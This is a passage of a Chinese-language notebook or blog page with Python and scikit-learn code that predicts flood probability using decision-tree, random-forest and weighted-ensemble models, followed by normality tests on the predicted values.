class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> cross_val_score</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> plot_tree</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> mean_squared_error</span><br><span class=\"line\"><span class=\"comment\"># 创建并训练决策树回归模型</span></span><br><span class=\"line\">tree_model = DecisionTreeRegressor(random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">tree_model.fit(X_train, y_train)</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上评估模型性能</span></span><br><span class=\"line\">tree_score = tree_model.score(X_test, y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Model Score :&quot;</span>, tree_score)</span><br><span class=\"line\"><span class=\"comment\"># 输出特征重要性</span></span><br><span class=\"line\">feature_importances = tree_model.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 将特征重要性展平</span></span><br><span class=\"line\">feature_importances_flat = np.ravel(feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 可视化特征重要性</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances_flat)), feature_importances_flat, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances_flat))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"><span class=\"comment\"># 在测试集上进行预测</span></span><br><span class=\"line\">y_pred = tree_model.predict(X_test)</span><br><span class=\"line\">theta = cosine(y_pred,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;theta&#125;</span>&#x27;</span>)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;均方误差为<span class=\"subst\">&#123;mse&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model Score : 0.06121741625318666\n特征重要性: [0.19938786 0.20108056 0.19957446 0.20072828 0.19922885]\n</code></pre>\n<p><img data-src=\"output_98_1.png\" alt=\"png\" /></p>\n<pre><code>余弦相似度为0.9952413117618393\n均方误差为0.0024401972992366535\n</code></pre>\n<h4 id=\"随机森林-2\"><a class=\"anchor\" href=\"#随机森林-2\">#</a> 随机森林</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rf = RandomForestRegressor(n_estimators=<span class=\"number\">4</span>, random_state=<span class=\"number\">42</span>) </span><br><span class=\"line\">rf.fit(X_train, y_train)</span><br><span class=\"line\">y_pred = rf.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = rf.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br><span class=\"line\">feature_importances = rf.feature_importances_</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征重要性:&quot;</span>, feature_importances)</span><br><span class=\"line\">feature_importances_flat = np.ravel(feature_importances)</span><br><span class=\"line\"><span class=\"comment\"># 可视化特征重要性</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">30</span>, <span class=\"number\">18</span>))</span><br><span class=\"line\">plt.bar(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(feature_importances_flat)), feature_importances_flat, tick_label=[<span class=\"string\">f&#x27;<span class=\"subst\">&#123;X_train.columns[i]&#125;</span>&#x27;</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(feature_importances_flat))])</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Feature&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Importance&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Feature Importance&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.08951717139739401\n均方误差为: 0.0023666371509472196\n余弦相似度为0.9953848954929839\n特征重要性: [0.19743656 0.2002398  0.20023184 0.20070336 0.20138843]\n</code></pre>\n<p><img data-src=\"output_100_1.png\" alt=\"png\" /></p>\n<h2 id=\"problem-four-预测洪水发生的概率\"><a class=\"anchor\" href=\"#problem-four-预测洪水发生的概率\">#</a> Problem FOUR 预测洪水发生的概率</h2>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> RandomForestClassifier</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> BaggingClassifier</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> BaggingRegressor</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> DecisionTreeClassifier</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.ensemble <span class=\"keyword\">import</span> GradientBoostingRegressor</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> train_test_split</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.datasets <span class=\"keyword\">import</span> load_iris</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.compose <span class=\"keyword\">import</span> ColumnTransformer</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.pipeline <span class=\"keyword\">import</span> Pipeline</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> LinearRegression</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.tree <span class=\"keyword\">import</span> DecisionTreeRegressor</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.preprocessing <span class=\"keyword\">import</span> StandardScaler</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> train_test_split</span><br><span class=\"line\"><span class=\"keyword\">import</span> joblib</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">bagging_model</span>:</span><br><span class=\"line\">    a_gb=<span class=\"number\">0.15</span></span><br><span class=\"line\">    a_ju=<span class=\"number\">0.15</span></span><br><span class=\"line\">    a_line=<span class=\"number\">0.4</span></span><br><span class=\"line\">    a_rf=<span class=\"number\">0.2</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>) -&gt; <span class=\"literal\">None</span>:</span><br><span class=\"line\">        self.gb_tree=GradientBoostingRegressor(n_estimators=<span class=\"number\">1000</span>, random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">        self.ju_tree=DecisionTreeRegressor(random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">        self.normal_line=LinearRegression()</span><br><span class=\"line\">        self.rf_forest=RandomForestRegressor(n_estimators=<span class=\"number\">20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">step</span>(<span class=\"params\">self,X_train,y_train,X_test,y_test</span>):</span><br><span class=\"line\">        y_test=np.array(y_test)</span><br><span class=\"line\">        y_test=y_test.flatten()</span><br><span class=\"line\">        pre_gb=self.gb_tree.predict(X_test)</span><br><span class=\"line\">        pre_gb=pre_gb.flatten()</span><br><span class=\"line\">        pre_ju=self.ju_tree.predict(X_test)</span><br><span class=\"line\">        pre_ju=pre_ju.flatten()</span><br><span class=\"line\">        pre_line=self.normal_line.predict(X_test)</span><br><span class=\"line\">        pre_line=pre_line.flatten()</span><br><span class=\"line\">        pre_rf=self.rf_forest.predict(X_test)</span><br><span class=\"line\">        pre_rf=pre_rf.flatten()</span><br><span class=\"line\">        df=pd.DataFrame(&#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;gb&#x27;</span>:pre_gb,</span><br><span class=\"line\">            <span class=\"string\">&#x27;ju&#x27;</span>:pre_ju,</span><br><span class=\"line\">            <span class=\"string\">&#x27;line&#x27;</span>:pre_line,</span><br><span class=\"line\">            <span class=\"string\">&#x27;rf&#x27;</span>:pre_rf,</span><br><span class=\"line\">            <span class=\"string\">&#x27;target&#x27;</span>:y_test</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        X_t=df.drop(columns=<span class=\"string\">&#x27;target&#x27;</span>)</span><br><span class=\"line\">        y_t=df[<span class=\"string\">&#x27;target&#x27;</span>]</span><br><span class=\"line\">        X_tr, X_te, y_tr, y_te = train_test_split(X_t, y_t, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">        MODEL=LinearRegression(fit_intercept=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        MODEL.fit(X_tr,y_tr)</span><br><span class=\"line\">        temp=MODEL.coef_</span><br><span class=\"line\">        temp=temp/<span class=\"built_in\">sum</span>(temp)</span><br><span class=\"line\">        self.a_gb=temp[<span class=\"number\">0</span>]</span><br><span class=\"line\">        self.a_ju=temp[<span class=\"number\">1</span>]</span><br><span class=\"line\">        self.a_line=temp[<span class=\"number\">2</span>]</span><br><span class=\"line\">        self.a_rf=temp[<span class=\"number\">3</span>]</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">fit</span>(<span class=\"params\">self,X_train,y_train</span>):</span><br><span class=\"line\">        X_t=X_train</span><br><span class=\"line\">        y_t=y_train</span><br><span class=\"line\">        <span class=\"comment\"># 有放回地抽样4次</span></span><br><span class=\"line\">        df = pd.merge(X_train,y_train,left_index=<span class=\"literal\">True</span>,right_index=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        data_list=[df.sample(frac=<span class=\"number\">1</span>, replace=<span class=\"literal\">True</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>)]</span><br><span class=\"line\">        data=data_list[<span class=\"number\">0</span>]</span><br><span class=\"line\">        X_train=data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">        y_train=data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">        self.gb_tree.fit(X_train,y_train)</span><br><span class=\"line\">        data=data_list[<span class=\"number\">1</span>]</span><br><span class=\"line\">        X_train=data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">        y_train=data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">        self.ju_tree.fit(X_train,y_train)</span><br><span class=\"line\">        data=data_list[<span class=\"number\">2</span>]</span><br><span class=\"line\">        X_train=data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">        y_train=data[[<span class=\"string\">&#x27;洪水概率&#x27;</span>]]</span><br><span class=\"line\">        self.normal_line.fit(X_train,y_train)</span><br><span class=\"line\">        data=data_list[<span class=\"number\">3</span>]</span><br><span class=\"line\">        X_train=data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">        y_train=data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">        self.rf_forest.fit(X_train,y_train)</span><br><span class=\"line\">        self.step(X_t,y_t,X_test,y_test)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">predict</span>(<span class=\"params\">self,X_test</span>):</span><br><span class=\"line\">        pre_gb=self.gb_tree.predict(X_test)</span><br><span class=\"line\">        pre_gb=pre_gb.flatten()</span><br><span class=\"line\">        pre_ju=self.ju_tree.predict(X_test)</span><br><span class=\"line\">        pre_ju=pre_ju.flatten()</span><br><span class=\"line\">        pre_line=self.normal_line.predict(X_test)</span><br><span class=\"line\">        pre_line=pre_line.flatten()</span><br><span class=\"line\">        pre_rf=self.rf_forest.predict(X_test)</span><br><span class=\"line\">        pre_rf=pre_rf.flatten()</span><br><span class=\"line\">        y_pred=pre_gb*self.a_gb+pre_ju*self.a_ju+pre_line*self.a_line+pre_rf*self.a_rf</span><br><span class=\"line\">        <span class=\"keyword\">return</span> y_pred</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">score</span>(<span class=\"params\">self,X_test,y_test</span>):</span><br><span class=\"line\">        score_gb=self.gb_tree.score(X_test,y_test)</span><br><span class=\"line\">        score_ju=self.ju_tree.score(X_test,y_test)</span><br><span class=\"line\">        score_line=self.normal_line.score(X_test,y_test)</span><br><span class=\"line\">        score_rf=self.rf_forest.score(X_test,y_test)</span><br><span class=\"line\">        score = score_gb*self.a_gb+score_ju*self.a_ju+score_line*self.a_line+score_rf*self.a_rf</span><br><span class=\"line\">        <span class=\"keyword\">return</span> score</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"训练集成模型\"><a class=\"anchor\" href=\"#训练集成模型\">#</a> 训练集成模型</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">train_data_path=<span class=\"string\">&#x27;../Data/train.csv&#x27;</span></span><br><span class=\"line\">train_data = pd.read_csv(train_data_path)</span><br><span class=\"line\">train_data = train_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">X=train_data.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\">y=train_data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class=\"number\">0.2</span>, random_state=<span class=\"number\">42</span>)</span><br><span class=\"line\">model=bagging_model()</span><br><span class=\"line\">model.fit(X_train,y_train)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"集成模型输出\"><a class=\"anchor\" href=\"#集成模型输出\">#</a> 集成模型输出</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">y_pred=model.predict(X_test)</span><br><span class=\"line\">mse = mean_squared_error(y_test, y_pred)</span><br><span class=\"line\">score = model.score(X_test,y_test)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Model score: <span class=\"subst\">&#123;score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;均方误差为: <span class=\"subst\">&#123;mse&#125;</span>&quot;</span>)</span><br><span class=\"line\">accuracy = cosine(y_test,y_pred)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;余弦相似度为<span class=\"subst\">&#123;accuracy&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<pre><code>Model score: 0.182629512994938\n均方误差为: 0.0021174324247682824\n余弦相似度为0.9958713234970328\n</code></pre>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 读取测试数据并进行预测</span></span><br><span class=\"line\">test_data_path = <span class=\"string\">&#x27;../Data/test.csv&#x27;</span></span><br><span class=\"line\">test_data = pd.read_csv(test_data_path)</span><br><span class=\"line\">test_ids = test_data[<span class=\"string\">&#x27;id&#x27;</span>]</span><br><span class=\"line\">X=test_data.drop(columns=<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">X_test=X.drop(columns=<span class=\"string\">&#x27;洪水概率&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">predictions = model.predict(X_test)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将预测结果写入submit.csv</span></span><br><span class=\"line\">submit_data = pd.DataFrame(&#123;<span class=\"string\">&#x27;id&#x27;</span>: test_ids, <span class=\"string\">&#x27;洪水概率&#x27;</span>: predictions&#125;)</span><br><span class=\"line\">submit_data.to_csv(<span class=\"string\">&#x27;../Data/submit.csv&#x27;</span>, index=<span class=\"literal\">False</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;预测结果已保存到 submit.csv&quot;</span>)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"通过绘制图形直方图和qq图-统计检验shapiro-wilk-检验-kolmogorov-smirnov-检验-anderson-darling-检验-dagostinos-k2-检验-描述性统计偏度skewness和峰度kurtosis\"><a class=\"anchor\" href=\"#通过绘制图形直方图和qq图-统计检验shapiro-wilk-检验-kolmogorov-smirnov-检验-anderson-darling-检验-dagostinos-k2-检验-描述性统计偏度skewness和峰度kurtosis\">#</a> 通过绘制图形（直方图和 QQ 图）、统计检验（Shapiro-Wilk 检验、Kolmogorov-Smirnov 检验、Anderson-Darling 检验、D'Agostino's K^2 检验）、描述性统计（偏度（Skewness）和峰度（Kurtosis））</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> scipy.stats <span class=\"keyword\">as</span> stats</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载数据</span></span><br><span class=\"line\">data = pd.read_csv(<span class=\"string\">&#x27;/mnt/data/submit.csv&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取洪水概率</span></span><br><span class=\"line\">flood_probabilities = data[<span class=\"string\">&#x27;洪水概率&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 绘制直方图和Q-Q图</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">plt.subplot(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">sns.histplot(flood_probabilities, kde=<span class=\"literal\">True</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;洪水概率的直方图&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">plt.subplot(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">stats.probplot(flood_probabilities, dist=<span class=\"string\">&quot;norm&quot;</span>, plot=plt)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;洪水概率的Q-Q图&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Shapiro-Wilk检验</span></span><br><span class=\"line\">shapiro_test = stats.shapiro(flood_probabilities)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Shapiro-Wilk 检验: W=<span class=\"subst\">&#123;shapiro_test[<span class=\"number\">0</span>]&#125;</span>, p值=<span class=\"subst\">&#123;shapiro_test[<span class=\"number\">1</span>]&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> shapiro_test[<span class=\"number\">1</span>] &gt; <span class=\"number\">0.05</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Shapiro-Wilk 检验结果: 数据服从正态分布&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Shapiro-Wilk 检验结果: 数据不服从正态分布&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Kolmogorov-Smirnov检验</span></span><br><span class=\"line\">ks_test = stats.kstest(flood_probabilities, <span class=\"string\">&#x27;norm&#x27;</span>, args=(np.mean(flood_probabilities), np.std(flood_probabilities)))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Kolmogorov-Smirnov 检验: D=<span class=\"subst\">&#123;ks_test[<span class=\"number\">0</span>]&#125;</span>, p值=<span class=\"subst\">&#123;ks_test[<span class=\"number\">1</span>]&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> ks_test[<span class=\"number\">1</span>] &gt; <span class=\"number\">0.05</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Kolmogorov-Smirnov 检验结果: 数据服从正态分布&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Kolmogorov-Smirnov 检验结果: 数据不服从正态分布&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Anderson-Darling检验</span></span><br><span class=\"line\">ad_test = stats.anderson(flood_probabilities, dist=<span class=\"string\">&#x27;norm&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Anderson-Darling 检验: A2=<span class=\"subst\">&#123;ad_test.statistic&#125;</span>, 临界值=<span class=\"subst\">&#123;ad_test.critical_values&#125;</span>, 显著性水平=<span class=\"subst\">&#123;ad_test.significance_level&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> ad_test.statistic &lt; ad_test.critical_values[<span class=\"number\">2</span>]:  <span class=\"comment\"># Typically, the 5% significance level is used</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Anderson-Darling 检验结果: 